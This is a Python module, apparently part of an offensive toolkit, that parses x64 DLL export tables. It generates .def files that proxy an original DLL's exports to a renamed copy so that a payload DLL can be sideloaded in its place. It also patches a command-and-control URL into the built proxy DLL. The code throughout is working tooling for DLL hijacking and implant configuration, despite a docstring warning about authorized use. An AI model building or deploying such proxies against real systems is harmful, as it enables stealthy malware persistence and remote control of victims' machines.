"""x64 DLL-proxy export parsing, .def generation, and proxy C2 patching.

This module never copies the original DLL. In particular, do not stage a DLL
from a Windows system directory beside an application: use an authorized,
application-owned copy of the original non-system DLL instead.
"""
import ntpath
import os
import struct
from collections import namedtuple

from . import pe


C2_SENTINEL = b"CKC2_DEADBEEF_"
C2_SLOT = 256
PAYLOAD_EXPORTS = frozenset(("payload_entry", "noop", "entry_stub"))

Export = namedtuple("Export", "ordinal rva names forwarder")
Export.__doc__ = "One export-address entry; names may contain aliases."
_PE = namedtuple("_PE", "blob sections headers directories")


class PEError(ValueError):
    """The input is not a supported, well-formed x64 native PE image."""


def _need(blob, offset, size, what):
    if offset < 0 or size < 0 or offset + size > len(blob):
        raise PEError("truncated " + what)


def _parse_pe(blob):
    if not isinstance(blob, (bytes, bytearray, memoryview)):
        raise TypeError("PE input must be bytes-like")
    blob = bytes(blob)
    _need(blob, 0, 64, "DOS header")
    if blob[:2] != b"MZ":
        raise PEError("missing MZ signature")
    pe_off = struct.unpack_from("<I", blob, 0x3C)[0]
    _need(blob, pe_off, 24, "PE header")
    if blob[pe_off:pe_off + 4] != b"PE\0\0":
        raise PEError("missing PE signature")
    machine, nsec = struct.unpack_from("<HH", blob, pe_off + 4)
    optsz = struct.unpack_from("<H", blob, pe_off + 20)[0]
    characteristics = struct.unpack_from("<H", blob, pe_off + 22)[0]
    if machine != 0x8664:
        raise PEError("only x64 PE images are supported")
    if not characteristics & 0x2000:
        raise PEError("proxy target must be a DLL")
    opt = pe_off + 24
    _need(blob, opt, optsz, "optional header")
    if optsz < 112 or struct.unpack_from("<H", blob, opt)[0] != 0x20B:
        raise PEError("only the PE32+ optional header is supported")
    headers = struct.unpack_from("<I", blob, opt + 60)[0]
    if headers > len(blob):
        raise PEError("SizeOfHeaders exceeds the file")
    # PE32+ has an eight-byte ImageBase and larger stack/heap fields: unlike
    # PE32, NumberOfRvaAndSizes is at 108 and the directories start at 112.
    ndirs = struct.unpack_from("<I", blob, opt + 108)[0]
    dir_count = min(ndirs, 16)
    _need(blob, opt, 112 + dir_count * 8, "data directories")
    if 112 + dir_count * 8 > optsz:
        raise PEError("data directories exceed the optional header")
    directories = [struct.unpack_from("<II", blob, opt + 112 + i * 8)
                   for i in range(dir_count)]
    if len(directories) > 14 and any(directories[14]):
        raise PEError(".NET assemblies are not native DLL proxies")

    sec_off = opt + optsz
    _need(blob, sec_off, nsec * 40, "section table")
    sections = []
    for i in range(nsec):
        off = sec_off + i * 40
        vsize, va, raw_size, raw_ptr = struct.unpack_from("<IIII", blob, off + 8)
        if raw_size:
            _need(blob, raw_ptr, raw_size, "section contents")
        if va + max(vsize, raw_size) > 0x100000000:
            raise PEError("section RVA range overflows")
        sections.append((va, vsize, raw_ptr, raw_size))
    return _PE(blob, sections, headers, directories)


def _region(image, rva):
    if rva < image.headers:
        return rva, image.headers - rva
    for va, _vsize, raw_ptr, raw_size in image.sections:
        delta = rva - va
        if 0 <= delta < raw_size:
            return raw_ptr + delta, raw_size - delta
    raise PEError("RVA 0x%x is not backed by file data" % rva)


def _rva_to_offset(image, rva, size=1):
    if size < 0 or rva + size > 0x100000000:
        raise PEError("RVA range overflows")
    offset, available = _region(image, rva)
    if size > available:
        raise PEError("RVA range crosses its file-backed region")
    _need(image.blob, offset, size, "RVA range")
    return offset


def _cstring(image, rva, what):
    offset, available = _region(image, rva)
    end = image.blob.find(b"\0", offset, offset + available)
    if end < 0:
        raise PEError("unterminated " + what)
    try:
        return image.blob[offset:end].decode("ascii")
    except UnicodeDecodeError:
        raise PEError("non-ASCII " + what)


def parse_exports(blob):
    """Return ``Export`` rows sorted by ordinal from a native x64 PE.

    ``names`` is a sorted tuple (empty for ordinal-only exports), and
    ``forwarder`` is the original forwarder string or ``None``. Null EAT slots
    are not exports and are omitted.
    """
    image = _parse_pe(blob)
    if not image.directories or not any(image.directories[0]):
        return []
    export_rva, export_size = image.directories[0]
    directory = _rva_to_offset(image, export_rva, 40)
    fields = struct.unpack_from("<IIHHIIIIIII", image.blob, directory)
    base, nfuncs, nnames, funcs_rva, names_rva, ords_rva = fields[5:11]
    if nfuncs and base + nfuncs - 1 > 0xFFFF:
        raise PEError("export ordinal range exceeds 16 bits")
    if nnames and not nfuncs:
        raise PEError("named exports without an export-address table")

    func_off = _rva_to_offset(image, funcs_rva, nfuncs * 4)
    funcs = struct.unpack_from("<%dI" % nfuncs, image.blob, func_off) if nfuncs else ()
    names_by_index = {}
    if nnames:
        name_off = _rva_to_offset(image, names_rva, nnames * 4)
        ord_off = _rva_to_offset(image, ords_rva, nnames * 2)
        name_rvas = struct.unpack_from("<%dI" % nnames, image.blob, name_off)
        ordinals = struct.unpack_from("<%dH" % nnames, image.blob, ord_off)
        seen = set()
        for name_rva, index in zip(name_rvas, ordinals):
            if index >= nfuncs:
                raise PEError("export name ordinal is outside the address table")
            if not funcs[index]:
                raise PEError("export name references a null address")
            name = _cstring(image, name_rva, "export name")
            if not name or name in seen:
                raise PEError("empty or duplicate export name")
            seen.add(name)
            names_by_index.setdefault(index, []).append(name)

    exports = []
    for index, rva in enumerate(funcs):
        if not rva:
            continue
        forwarder = None
        if export_rva <= rva < export_rva + export_size:
            forwarder = _cstring(image, rva, "export forwarder")
        names = tuple(sorted(names_by_index.get(index, ())))
        exports.append(Export(base + index, rva, names, forwarder))
    return exports


def sibling_dll_name(original_name):
    """Return ``name_ck.dll`` for an original path or file name."""
    base = ntpath.basename(os.fspath(original_name))
    stem, ext = ntpath.splitext(base)
    if not stem or ext.lower() != ".dll":
        raise PEError("original name must name a .dll file")
    return stem + "_ck.dll"


def _check_def_name(name):
    if (not name or any(ord(c) < 33 or ord(c) > 126 or c in '",=' for c in name)):
        raise PEError("export name cannot be represented safely in a .def: %r" % name)


def generate_def(blob, original_name, renamed=None):
    """Generate linker DEF text forwarding exports to the renamed sibling.

    ``renamed`` must be a file name, not a path. Ordinal-only exports receive a
    synthetic ``NONAME`` entry. Forwarded and data exports are forwarded just
    like code exports; no attempt is made to infer their C/C++ types.
    """
    original = sibling_dll_name(original_name)
    sibling = original if renamed is None else os.fspath(renamed)
    if ntpath.basename(sibling) != sibling or not sibling.lower().endswith(".dll"):
        raise PEError("renamed sibling must be a .dll file name without a path")
    if sibling.lower() == ntpath.basename(os.fspath(original_name)).lower():
        raise PEError("renamed sibling must differ from the original DLL")
    module = ntpath.splitext(sibling)[0]
    _check_def_name(module)
    exports = parse_exports(blob)
    conflicts = sorted({name for row in exports for name in row.names}
                       & PAYLOAD_EXPORTS)
    if conflicts:
        raise PEError("original exports conflict with payload: " + ", ".join(conflicts))

    lines = ["; Generated x64 DLL-proxy forwards", "EXPORTS"]
    used_names = {name for row in exports for name in row.names}
    for row in exports:
        target = "%s.#%d" % (module, row.ordinal)
        for name in row.names:
            _check_def_name(name)
            lines.append("    %s=%s @%d" % (name, target, row.ordinal))
        if not row.names:
            alias = "__ck_ordinal_%d" % row.ordinal
            while alias in used_names:
                alias += "_"
            used_names.add(alias)
            lines.append("    %s=%s @%d NONAME" % (alias, target, row.ordinal))
    return "\r\n".join(lines) + "\r\n"


def patch_proxy_c2(proxy_path, c2_url):
    """Patch only the explicit built proxy DLL's 256-byte C2 slot.

    Returns the patched file offset. Missing/ambiguous/already-patched slots,
    invalid PE files, and invalid URLs are errors; no other artifact is tried.
    """
    path = os.fspath(proxy_path)
    if not path.lower().endswith(".dll") or not os.path.isfile(path):
        raise PEError("proxy_path must be an existing built .dll")
    if isinstance(c2_url, str):
        try:
            url = c2_url.encode("ascii")
        except UnicodeEncodeError:
            raise PEError("C2 URL must be ASCII")
    elif isinstance(c2_url, (bytes, bytearray)):
        url = bytes(c2_url)
    else:
        raise TypeError("c2_url must be str or bytes")
    if not 1 <= len(url) < C2_SLOT or b"\0" in url:
        raise PEError("C2 URL must contain 1..255 non-NUL bytes")

    with open(path, "rb") as f:
        blob = f.read()
    _parse_pe(blob)  # Do not patch arbitrary files that merely have a .dll suffix.
    offset = pe.patch_ready(blob, C2_SENTINEL, C2_SLOT)
    if offset < 0:
        raise PEError("proxy C2 sentinel is missing, unsafe, or already patched")
    replacement = url + b"\0" * (C2_SLOT - len(url))
    with open(path, "r+b") as f:
        f.seek(offset)
        written = f.write(replacement)
        if written != C2_SLOT:
            raise OSError("short write while patching proxy C2 slot")
    return offset
